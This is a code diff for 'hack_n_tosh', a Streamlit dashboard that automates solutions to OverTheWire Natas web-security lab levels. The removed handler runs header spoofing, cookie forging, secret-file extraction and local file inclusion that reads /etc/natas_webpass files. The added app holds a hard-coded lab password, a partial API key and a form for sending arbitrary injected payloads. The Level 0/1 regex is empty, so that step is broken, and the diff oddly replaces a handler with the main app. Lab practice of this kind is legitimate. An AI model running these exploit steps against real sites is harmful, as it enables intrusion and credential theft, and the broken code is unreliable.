@@ -1,224 +1,136 @@
 import streamlit as st
+import requests
+from bs4 import BeautifulSoup
 import re
-from .utils import initialize_http_session
+import json
+import time
+import base64
+from google import genai
+from google.genai import types
+from supabase import create_client
+from modules import group_1_handlers, group_2_handlers, group_3_handlers
 
-def execute(level_name, context):
-    st.markdown(f"### 📋 Running: {level_name}")
-    
-    session = initialize_http_session(context)
-    base_url = context['url'].rstrip('/')
-    
-    # =========================================================================
-    # LEVELS 0 & 1: Source Code Comment Scraping
-    # =========================================================================
-    if level_name in ["Level 0", "Level 1"]:
-        st.info(f"{level_name} selected: Scraping source comment arrays...")
-        try:
-            response = session.get(base_url, timeout=10)
-            if response.status_code == 200:
-                st.success("Successfully fetched page source.")
-                
-                # Extract 32-character tokens inside HTML comment strings
-                all_tokens = re.findall(r'', response.text, re.DOTALL)
-                valid_tokens = [t for t in all_tokens if t != context['password']]
-                
-                if valid_tokens:
-                    next_lvl = int(level_name.split()[-1]) + 1
-                    st.success(f"🎯 Password for Level {next_lvl} captured!")
-                    st.code(f"Natas {next_lvl} Password: {valid_tokens[0]}")
-                else:
-                    st.warning("No password tokens found embedded inside source comments.")
-                    with st.expander("View Clean Source Canvas"):
-                        st.code(response.text, language="html")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
+# ==========================================
+# PLATFORM CORE CONFIGURATIONS
+# ==========================================
+st.set_page_config(page_title="hack_n_tosh Dashboard", layout="wide")
 
-    # =========================================================================
-    # LEVEL 2: Directory Indexing File Disclosure
-    # =========================================================================
-    elif level_name == "Level 2":
-        st.info("Level 2 selected: Targeting the exposed directory indexing path...")
-        target_directory_url = f"{base_url}/files/"
-        try:
-            dir_response = session.get(target_directory_url, timeout=10)
-            if dir_response.status_code == 200:
-                st.success("Successfully accessed the `/files/` directory listing.")
-                file_match = re.search(r'href="([^"]+\.txt)"', dir_response.text)
-                
-                if file_match:
-                    target_file = file_match.group(1)
-                    st.write(f"📂 Identified potentially sensitive file: `{target_file}`")
-                    file_url = f"{target_directory_url}{target_file}"
-                    file_response = session.get(file_url, timeout=10)
-                    
-                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', file_response.text)
-                    valid_tokens = [t for t in all_tokens if t != context['password']]
-                    
-                    if valid_tokens:
-                        st.success(f"🎯 Successfully extracted token for the next level!")
-                        st.code(f"Natas 3 Password: {valid_tokens[0]}")
-                    else:
-                        st.warning("No new 32-character tokens found inside the target file.")
-                else:
-                    st.error("Could not find any text file links inside the directory listing.")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
+st.title("🤖 hack_n_tosh: Multi-Model Autonomous Engine")
+st.subheader("Stable Network Execution Layer & Multi-AI Failover Router")
+st.markdown("---")
 
-    # =========================================================================
-    # LEVEL 3: Information Disclosure via robots.txt
-    # =========================================================================
-    elif level_name == "Level 3":
-        st.info("Level 3 selected: Checking the `robots.txt` file for hidden asset directories...")
-        robots_url = f"{base_url}/robots.txt"
-        try:
-            robots_res = session.get(robots_url, timeout=10)
-            if robots_res.status_code == 200:
-                st.success("Successfully read `robots.txt` from server root.")
-                hidden_paths = re.findall(r'Disallow:\s*([^\s\n]+)', robots_res.text)
-                
-                if hidden_paths:
-                    secret_dir = hidden_paths[0].strip('/')
-                    st.write(f"🔍 Discovered restricted directory path: `/{secret_dir}/`")
-                    secret_url = f"{base_url}/{secret_dir}/"
-                    secret_res = session.get(secret_url, timeout=10)
-                    
-                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', secret_res.text)
-                    file_match = re.search(r'href="([^"]+\.txt)"', secret_res.text)
-                    
-                    if file_match:
-                        specific_file_url = f"{secret_url}{file_match.group(1)}"
-                        specific_file_res = session.get(specific_file_url, timeout=10)
-                        all_tokens += re.findall(r'\b[A-Za-z0-9]{32}\b', specific_file_res.text)
-                        
-                    valid_tokens = [t for t in all_tokens if t != context['password']]
-                    if valid_tokens:
-                        st.success("🎯 Successfully navigated directory exclusions and captured flag!")
-                        st.code(f"Natas 4 Password: {valid_tokens[0]}")
-                    else:
-                        st.warning("Could not automatically locate a new token string in the secret folder.")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
+# ==========================================
+# SIDEBAR: Permanent Parameter State
+# ==========================================
+st.sidebar.header("🎯 Target Parameters")
+target_base_url = st.sidebar.text_input("Target Base URL", value="http://natas26.natas.labs.overthewire.org")
+username = st.sidebar.text_input("Username", value="natas26")
+password = st.sidebar.text_input("Password", value="ckELKUWZUfPOv6uxS6M7lXBpBssJZ4Ws", type="password")
 
-    # =========================================================================
-    # LEVEL 4: HTTP Referer Header Spoofing
-    # =========================================================================
-    elif level_name == "Level 4":
-        st.info("Level 4 selected: Emulating authorized HTTP Referer tracking header...")
-        custom_headers = {
-            "User-Agent": context["user_agent"],
-            "Referer": "http://natas5.natas.labs.overthewire.org/"
-        }
-        try:
-            response = session.get(base_url, headers=custom_headers, timeout=10)
-            if response.status_code == 200:
-                st.success("Target endpoint processed modified header state cleanly.")
-                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
-                valid_tokens = [t for t in all_tokens if t != context['password']]
-                if valid_tokens:
-                    st.success("🎯 Referer modification bypass verified!")
-                    st.code(f"Natas 5 Password: {valid_tokens[0]}")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
+st.sidebar.markdown("---")
+st.sidebar.header("🧠 AI Brain Configuration")
 
-    # =========================================================================
-    # LEVEL 5: Session Cookie Status Overriding
-    # =========================================================================
-    elif level_name == "Level 5":
-        st.info("Level 5 selected: Injecting authorization value into the session cookie map...")
-        session.cookies.set("loggedin", "1", domain="natas5.natas.labs.overthewire.org")
-        try:
-            response = session.get(base_url, timeout=10)
-            if response.status_code == 200:
-                st.success("Target context boundary read modification state cleanly.")
-                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
-                valid_tokens = [t for t in all_tokens if t != context['password']]
-                if valid_tokens:
-                    st.success("🎯 Cookie parameter injection bypass verified!")
-                    st.code(f"Natas 6 Password: {valid_tokens[0]}")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
+ai_provider = st.sidebar.selectbox("Select AI Model Provider", ["Gemini (Google AI)", "Groq (Llama / Mixtral)"])
 
-    # =========================================================================
-    # LEVEL 6: Configuration File Secret Extraction & POST Request Handling
-    # =========================================================================
-    elif level_name == "Level 6":
-        st.info("Level 6 selected: Fetching key parameters from the `includes/` subdirectory...")
-        secret_include_url = f"{base_url}/includes/secret.inc"
-        try:
-            include_response = session.get(secret_include_url, timeout=10)
-            
-            if include_response.status_code == 200:
-                st.success("Successfully accessed the `includes/secret.inc` data block.")
-                raw_text = include_response.text.strip()
-                
-                # Robust regex: matches $secret = "VALUE" regardless of short open php tag wrappers
-                secret_match = re.search(r'\$secret\s*=\s*["\']([^"\']+)["\']', raw_text)
-                
-                if secret_match:
-                    retrieved_secret = secret_match.group(1)
-                else:
-                    retrieved_secret = raw_text if len(raw_text) > 0 and "<?" not in raw_text else None
+# DATA STORAGE AND API ROUTING CONFIGURATION
+DEFAULT_GEMINI_KEY = "AIzaSyAnciRLYdPDOR345XQFRI..."  # Replace with your actual key
+SUPABASE_URL = "https://your-supabase-url.supabase.co"
+SUPABASE_ANON_KEY = "your-supabase-anon-key"
 
-                if retrieved_secret:
-                    st.write(f"🔑 Extracted Verification Key: `{retrieved_secret}`")
-                    post_payload = {
-                        "secret": retrieved_secret,
-                        "submit": "Submit"
-                    }
-                    st.info("Submitting payload parameter to the form handler via POST...")
-                    execution_response = session.post(base_url, data=post_payload, timeout=10)
-                    
-                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', execution_response.text)
-                    valid_tokens = [t for t in all_tokens if t != context['password']]
-                    
-                    if valid_tokens:
-                        st.success("🎯 Form authentication successful!")
-                        st.code(f"Natas 7 Password: {valid_tokens[0]}")
-                    else:
-                        st.warning("Could not extract a brand new 32-character token string.")
-                        with st.expander("View Server Post-Response Canvas"):
-                            st.code(execution_response.text, language="html")
-                else:
-                    st.error("Failed to parse an active secret value from the include file layer.")
-            else:
-                st.error(f"Failed to reach inclusion file directory. HTTP code: {include_response.status_code}")
-        except Exception as e:
-            st.error(f"Module execution failed: {str(e)}")
+# Optional manual tracking adjustments
+st.sidebar.markdown("---")
+st.sidebar.header("⚙️ Request Interceptor Overrides")
+manual_cookie = st.sidebar.text_input("Manual Session Cookie (PHPSESSID)", value="")
+custom_user_agent = st.sidebar.text_input("Custom User-Agent Header", value="Mozilla/5.0 (hack_n_tosh/1.0)")
 
-    # =========================================================================
-    # LEVEL 7: Arbitrary Query Traversal (LFI Injection)
-    # =========================================================================
-    elif level_name == "Level 7":
-        st.info("Level 7 selected: Executing local file inclusion query parameter routing...")
-        target_file_path = "/etc/natas_webpass/natas8"
-        request_parameters = {"page": target_file_path}
-        try:
-            response = session.get(base_url, params=request_parameters, timeout=10)
-            if response.status_code == 200:
-                st.success("The target instance processed the parameter routing path successfully.")
-                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
-                valid_tokens = [t for t in all_tokens if t != context['password']]
-                if valid_tokens:
-                    st.success("🎯 Path parameter traversal validated!")
-                    st.code(f"Natas 8 Password: {valid_tokens[0]}")
-                else:
-                    st.warning("Could not automatically locate an isolated 32-character pattern block.")
-                    with st.expander("View Server Document Canvas"):
-                        st.code(response.text, language="html")
-        except Exception as e:
-            st.error(f"Module extinction failed: {str(e)}")
-            
-    # =========================================================================
-    # FALLBACK ENGINE: Generic Baseline Execution Layout
-    # =========================================================================
+# Initialize External Storage Components Natively
+try:
+    ai_client = genai.Client(api_key=DEFAULT_GEMINI_KEY)
+    supabase_client = create_client(SUPABASE_URL, SUPABASE_ANON_KEY)
+except Exception as init_err:
+    st.sidebar.error("Client Init Warning: Verify Key Configuration.")
+
+# ==========================================
+# MAIN WORKSPACE: Methodology Grouping Engine
+# ==========================================
+st.header("🛠️ Multi-Level Test Matrix Controller")
+
+methodology_group = st.selectbox(
+    "Select Methodology Group:",
+    [
+        "Group 1: Static Controls & Information Disclosure (Levels 0 - 10)",
+        "Group 2: Input Validation & Parameter Control (Levels 11 - 16)",
+        "Group 3: Session Tracking & Header Monitoring (Levels 17 - 25)"
+    ]
+)
+
+# Render individual modules based on group choice
+if "Group 1" in methodology_group:
+    selected_level = st.selectbox("Select Target Module:", [f"Level {i}" for i in range(11)])
+elif "Group 2" in methodology_group:
+    selected_level = st.selectbox("Select Target Module:", [f"Level {i}" for i in range(11, 17)])
+else:
+    selected_level = st.selectbox("Select Target Module:", [f"Level {i}" for i in range(17, 26)])
+
+st.markdown(f"Active Status: **{selected_level}** module framework is armed.")
+
+# ==========================================
+# EXECUTION ROUTER TRIPPERS
+# ==========================================
+if st.button("🚀 Fire Active Verification Module"):
+    if not target_base_url or not password:
+        st.error("❌ Target URL and Boundary Password are required to run module sequences.")
     else:
-        st.info(f"Targeting baseline configuration content for generic processing...")
-        try:
-            response = session.get(base_url, timeout=10)
-            st.success("Handshake completed successfully.")
-            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
-            valid_tokens = [t for t in all_tokens if t != context['password']]
-            if valid_tokens:
-                st.code(f"Extracted Token: {valid_tokens[0]}")
-        except Exception as e:
-            st.error(f"Error executing fallback module: {str(e)}")
+        # Building the common context map to pass variables down to modules safely
+        context = {
+            "url": target_base_url,
+            "username": username,
+            "password": password,
+            "cookie": manual_cookie if manual_cookie else None,
+            "user_agent": custom_user_agent,
+            "ai_provider": ai_provider,
+            "ai_client": ai_client if 'ai_client' in locals() else None,
+            "supabase": supabase_client if 'supabase_client' in locals() else None
+        }
+        
+        st.info(f"🔄 Routing engine controls to module handlers for {selected_level}...")
+        
+        # Call the corresponding module routing function
+        if "Group 1" in methodology_group:
+            group_1_handlers.execute(selected_level, context)
+        elif "Group 2" in methodology_group:
+            group_2_handlers.execute(selected_level, context)
+        elif "Group 3" in methodology_group:
+            group_3_handlers.execute(selected_level, context)
+
+# ==========================================
+# PROVISION FOR EXTERNAL HELP APPROACH
+# ==========================================
+if st.checkbox("🛠️ Show Provision Mode (Manual Assistance & Custom Parameters)"):
+    st.markdown("---")
+    st.header("🛠️ Provision Mode: Manual Assistance & Custom Parameters")
+    st.warning("Automation router halted or custom parameters required. Send arbitrary requests below:")
+    
+    col1, col2 = st.columns(2)
+    with col1:
+        custom_endpoint = st.text_input("Custom Target Sub-URL Path", value="index.php")
+        param_key = st.text_input("POST Payload Form Key", value="username")
+        param_val = st.text_area("Custom Injected Payload Value", value="")
+    
+    with col2:
+        st.markdown("#### ⚙️ Manual Operations Dashboard")
+        st.write("Use this workspace to test variations manually when data patterns fluctuate.")
+        
+        if st.button("⚡ Transmit Custom Request"):
+            try:
+                session = requests.Session()
+                session.auth = (username, password)
+                if manual_cookie:
+                    session.cookies.set('PHPSESSID', manual_cookie)
+                
+                custom_data = {param_key: param_val}
+                manual_res = session.post(f"{target_base_url}/{custom_endpoint}", data=custom_data)
+                st.markdown("**Server Response Box:**")
+                st.code(manual_res.text)
+            except Exception as manual_error:
+                st.error(f"Manual transmit failure: {str(manual_error)}")
